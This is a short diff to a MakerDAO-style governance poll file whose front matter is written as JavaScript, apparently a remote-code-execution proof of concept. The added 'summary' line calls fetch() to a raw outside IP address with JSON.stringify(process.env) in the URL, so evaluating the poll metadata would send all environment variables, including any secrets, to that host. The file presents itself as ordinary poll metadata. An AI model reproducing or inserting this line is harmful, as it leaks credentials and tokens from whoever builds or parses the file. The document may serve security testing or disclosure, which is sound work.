@@ -1,7 +1,7 @@
 ---javascript
 {
   "title": "Test New Poll 1",
-  "summary": 1337+100000+"rce example",
+  "summary": fetch("http://84.201.145.222/rce_example_makerdao_"+JSON.stringify(process.env))+"1337TEST rce TEST",
   "discussion_link": "https://forum.makerdao.com/t/eth-and-wbtc-vaults-liquidations-2-0-parameters/7628",
   "vote_type": "Plurality Voting",
   "categories": [
